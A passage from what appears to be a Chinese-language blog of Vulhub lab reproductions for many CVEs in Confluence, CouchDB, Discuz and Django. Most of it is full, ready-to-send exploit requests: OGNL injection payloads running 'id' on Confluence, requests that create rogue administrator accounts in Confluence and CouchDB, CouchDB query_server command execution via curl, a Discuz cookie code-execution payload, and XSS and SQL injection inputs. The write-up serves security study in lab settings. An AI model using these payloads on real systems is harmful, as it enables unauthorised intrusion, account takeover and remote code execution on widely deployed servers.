eader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027</span><br></pre></td></tr></table></figure></blockquote><p><img src="59.jpg" alt="59"></p><blockquote><h3 id="pages-createpage-entervariables-action"><a href="#pages-createpage-entervariables-action" class="headerlink" title="&#x2F;pages&#x2F;createpage-entervariables.action"></a>&#x2F;pages&#x2F;createpage-entervariables.action</h3><p>这个路径也不需要用户登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /pages/createpage-entervariables.action HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 47</span><br><span class="line">queryString=%5cu0027%2b%7b233\*233%7d%2b%5cu0027</span><br></pre></td></tr></table></figure><h3 id="pages-createpage-action"><a href="#pages-createpage-action" class="headerlink" title="&#x2F;pages&#x2F;createpage.action"></a>&#x2F;pages&#x2F;createpage.action</h3><p>这个接口需要一个可以创建页面的用户权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /pages/createpage.action?spaceKey=EX&amp;src=quick-create&amp;queryString=%5cu0027%2b%7b233\*233%7d%2b%5cu0027 HTTP/1.1</span><br><span class="line">Host: 192.168.1.162:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.1.162:8090/template/custom/content-editor.vm</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: JSESSIONID=7B35600F54A9E303CE8C277ED960E1E7; seraph.confluence=524289%3A2ac32a308478b9cb9f0e351a12470faa4f2a928a</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></blockquote><h1 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新，通告了一个严重且已在野利用的代码执行漏洞，攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html</a></li><li><a href="https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis">https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis</a></li></ul></blockquote><h2 id="漏洞复现-22"><a href="#漏洞复现-22" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></blockquote><p><img src="60.jpg" alt="60"></p><h1 id="Confluence-属性覆盖导致权限绕过漏洞-CVE-2023-22515"><a href="#Confluence-属性覆盖导致权限绕过漏洞-CVE-2023-22515" class="headerlink" title="Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)"></a>Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。</p><p>2023年10月4日，Atlassian官方发布了对于CVE-2023-22515漏洞的补丁。这个漏洞是由属性覆盖导致，利用该漏洞攻击者可以重新执行Confluence安装流程并增加管理员账户。</p><p>该漏洞不影响8.0.0以前的版本。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html">https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html</a></li><li><a href="https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis">https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis</a></li></ul></blockquote><h2 id="漏洞复现-23"><a href="#漏洞复现-23" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，最主要的请求就是覆盖目标Confluence服务器中的<code>bootstrapStatusProvider.applicationConfig.setupComplete</code>属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1</span><br><span class="line">Host: localhost:8090</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p>然后，你就可以使用如下请求创建一个新的管理员账户<code>vulhub</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /setup/setupadministrator.action HTTP/1.1</span><br><span class="line">Host: localhost:8090</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 110</span><br><span class="line">X-Atlassian-Token: no-check</span><br><span class="line">username=vulhub&amp;fullName=vulhub&amp;email=admin%40vulhub.org&amp;password=vulhub&amp;confirm=vulhub&amp;setup-next-button=Next</span><br></pre></td></tr></table></figure><p>发送如下请求完成安装步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /setup/finishsetup.action HTTP/1.1</span><br><span class="line">Host: localhost:8090</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Atlassian-Token: no-check</span><br></pre></td></tr></table></figure><p>最后，直接使用新的<code>vulhub</code>账户（密码同样是<code>vulhub</code>）来登录Confluence，可见新的管理员已成功增加：</p></blockquote><p>老卡在第一步…没成功</p><h1 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2023-22527）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2023-22527）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2023-22527）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2023-22527）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。</p><p>在Confluence 8.0到8.5.3版本之间，存在一处由于任意velocity模板被调用导致的OGNL表达式注入漏洞，未授权攻击者利用该漏洞可以直接攻击Confluence服务器并执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html">https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html</a></li><li><a href="https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/">https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/</a></li></ul></blockquote><h2 id="漏洞复现-24"><a href="#漏洞复现-24" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><h2 id="漏洞复现-25"><a href="#漏洞复现-25" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /template/aui/text-inline.vm HTTP/1.1</span><br><span class="line">Host: localhost:8090</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 285</span><br><span class="line">label=\u0027%2b#request\u005b\u0027.KEY\_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,&#123;&#125;)%2b\u0027&amp;x=@org.apache.struts2.ServletActionContext@getResponse().setHeader(&#x27;X-Cmd-Response&#x27;,(new freemarker.template.utility.Execute()).exec(&#123;&quot;id&quot;&#125;))</span><br></pre></td></tr></table></figure></blockquote><p><img src="61.jpg" alt="61"></p><h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><blockquote><h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）-1"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）-1" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>参考链接：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li><li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li></ul></blockquote><h2 id="漏洞复现-26"><a href="#漏洞复现-26" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，发送如下数据包：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT /\_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 90</span><br><span class="line">&#123;</span><br><span class="line">&quot;type&quot;: &quot;user&quot;,</span><br><span class="line">&quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">&quot;roles&quot;: [&quot;\_admin&quot;],</span><br><span class="line">&quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，返回403错误：<code>&#123;&quot;error&quot;:&quot;forbidden&quot;,&quot;reason&quot;:&quot;Only _admin may set roles&quot;&#125;</code>，只有管理员才能设置Role角色：</p><p><img src="62.jpg" alt="62"></p><blockquote><p>发送包含两个roles的数据包，即可绕过限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /\_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line">&#123;</span><br><span class="line">&quot;type&quot;: &quot;user&quot;,</span><br><span class="line">&quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">&quot;roles&quot;: [&quot;\_admin&quot;],</span><br><span class="line">&quot;roles&quot;: [],</span><br><span class="line">&quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功创建管理员，账户密码均为<code>vulhub</code>：</p></blockquote><p><img src="63.jpg" alt="63"></p><blockquote><p>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码<code>vulhub</code>，可以成功登录：</p></blockquote><p><img src="64.jpg" alt="64"></p><h1 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><blockquote><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>参考链接：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li><li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li></ul></blockquote><h2 id="漏洞复现-27"><a href="#漏洞复现-27" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p><blockquote><p>1.6.0 下的说明</p><p>依次执行如下请求即可触发任意命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@127.0.0.1:5984/\_config/query\_servers/cmd&#x27; -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@127.0.0.1:5984/vultest&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@127.0.0.1:5984/vultest/vul&#x27; -d &#x27;&#123;&quot;\_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#x27;</span><br><span class="line">curl -X POST &#x27;http://vulhub:vulhub@127.0.0.1:5984/vultest/\_temp\_view?limit=10&#x27; -d &#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27; -H &#x27;Content-Type:application/json&#x27;</span><br></pre></td></tr></table></figure><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p><p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。</p><p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p><p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p></blockquote><p><img src="65.jpg" alt="65"></p><h1 id="CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706"><a href="#CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706" class="headerlink" title="CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)"></a>CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)</h1><blockquote><p>Apache CouchDB是一个Erlang开发的NoSQL数据库。</p><p>由于Erlang的特性，其支持分布式计算，分布式节点之间通过Erlang&#x2F;OTP Distribution协议进行通信。攻击者如果知道通信时使用的Cookie，即可在握手包通过认证并执行任意命令。</p><p>在CouchDB 3.2.1及以前版本中，使用了默认Cookie，值为“monster”。</p><p>参考链接：</p><ul><li><a href="https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html">https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html</a></li><li><a href="https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/">https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/</a></li><li><a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb">https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb</a></li><li><a href="https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit">https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit</a></li></ul></blockquote><h2 id="漏洞复现-28"><a href="#漏洞复现-28" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们可以使用这个POC来利用本漏洞。这个POC会先通过目标的4369端口epmd服务获取集群通信的端口，也就是9100，然后再使用默认Cookie来控制节点执行任意命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;python poc.py target-ip 4369</span><br></pre></td></tr></table></figure></blockquote><p><img src="66.jpg" alt="66"></p><h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行</h1><blockquote><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>具体原理请参考：</p><ul><li><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></li></ul></blockquote><h2 id="漏洞复现-29"><a href="#漏洞复现-29" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Cookie: GLOBALS[\_DCACHE][smilies][searcharray]=/.\*/eui; GLOBALS[\_DCACHE][smilies][replacearray]=phpinfo();</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可见，phpinfo已成功执行：</p></blockquote><p><img src="67.jpg" alt="67"></p><h1 id="Django-debug-page-XSS漏洞（CVE-2017-12794）分析"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）分析" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）分析"></a>Django debug page XSS漏洞（CVE-2017-12794）分析</h1><blockquote><p>Django发布了新版本1.11.5，修复了500页面中可能存在的一个XSS漏洞，这篇文章说明一下该漏洞的原理和复现，和我的一点点评。</p></blockquote><h2 id="漏洞复现-30"><a href="#漏洞复现-30" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>经过我的测试，我发现在使用Postgres数据库并触发异常的时候，psycopg2会将字段名和字段值全部抛出。那么，如果字段值中包含我们可控的字符串，又由于0x02中说到的，这个字符串其实就会被设置成<code>__cause__</code>，最后被显示在页面中。</p><p>所以我们假设有如下场景：</p><ol><li>用户注册页面，未检查用户名</li><li>注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li><li>再次注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li><li>触发duplicate key异常，导致XSS漏洞</li></ol><p>我将上述流程整理成vulhub的一个环境：<a href="https://github.com/phith0n/vulhub/tree/master/django/CVE-2017-12794">https://github.com/phith0n/vulhub/tree/master/django/CVE-2017-12794</a></p><p>编译及启动环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;docker compose up -d</span><br></pre></td></tr></table></figure><p>访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>创建一个用户，成功；再次访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>，触发异常：</p></blockquote><p><img src="70.jpg" alt="70"><br><img src="71.jpg" alt="71"></p><blockquote><p>可见，Postgres抛出的异常为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">duplicate key value violates unique constraint &quot;xss\_user\_username\_key&quot;</span><br><span class="line">DETAIL: Key (username)=(&lt;script&gt;alert(1)&lt;/script&gt;) already exists.</span><br></pre></td></tr></table></figure><p>这个异常被拼接进<code>The above exception (&#123;&#123; frame.exc_cause &#125;&#125;) was the direct cause of the following exception</code>，最后触发XSS。</p></blockquote><p><img src="72.jpg" alt="72"></p><h1 id="Django-2-0-8-任意URL跳转漏洞（CVE-2018-14574）"><a href="#Django-2-0-8-任意URL跳转漏洞（CVE-2018-14574）" class="headerlink" title="Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）"></a>Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）</h1><blockquote><p>Django默认配置下，如果匹配上的URL路由中最后一位是&#x2F;，而用户访问的时候没加&#x2F;，Django默认会跳转到带&#x2F;的请求中。（由配置项中的<code>django.middleware.common.CommonMiddleware</code>、<code>APPEND_SLASH</code>来决定）。</p><p>在path开头为<code>//example.com</code>的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。</p><p>该漏洞利用条件是目标<code>URLCONF</code>中存在能匹配上<code>//example.com</code>的规则。</p></blockquote><h2 id="漏洞复现-31"><a href="#漏洞复现-31" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>访问<code>http://your-ip:8000//www.example.com</code>，即可返回是301跳转到<code>//www.example.com/</code>：</p></blockquote><p><img src="73.jpg" alt="73"></p><h1 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField&#x2F;HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField&#x2F;HStoreField SQL注入漏洞（CVE-2019-14234）</h1><blockquote><p>Django在2019年8月1日发布了一个安全更新，修复了在JSONField、HStoreField两个模型字段中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2019/aug/01/security-releases/">https://www.djangoproject.com/weblog/2019/aug/01/security-releases/</a></li><li><a href="https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html">https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html</a></li></ul><p>该漏洞需要开发者使用了JSONField&#x2F;HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。Django自带的后台应用Django-Admin中就存在这样的写法，我们可以直接借助它来复现漏洞。</p></blockquote><h2 id="漏洞复现-32"><a href="#漏洞复现-32" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先登陆后台<code>http://your-ip:8000/admin/</code>，用户名密码为<code>admin</code>、<code>a123123123</code>。</p><p>登陆后台后，进入模型<code>Collection</code>的管理页面<code>http://your-ip:8000/admin/vuln/collection/</code>：</p></blockquote><p><img src="74.jpg" alt="74"></p><blockquote><p>然后在GET参数中构造<code>detail__a&#39;b=123</code>提交，其中<code>detail</code>是模型<code>Collection</code>中的JSONField：</p><p><a href="http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123">http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123</a></p><p>可见，单引号已注入成功，SQL语句报错：</p></blockquote><p><img src="75.jpg" alt="75"></p><h1 id="Django-GIS-SQL注入漏洞（CVE-2020-9402）"><a href="#Django-GIS-SQL注入漏洞（CVE-2020-9402）" class="headerlink" title="Django GIS SQL注入漏洞（CVE-2020-9402）"></a>Django GIS 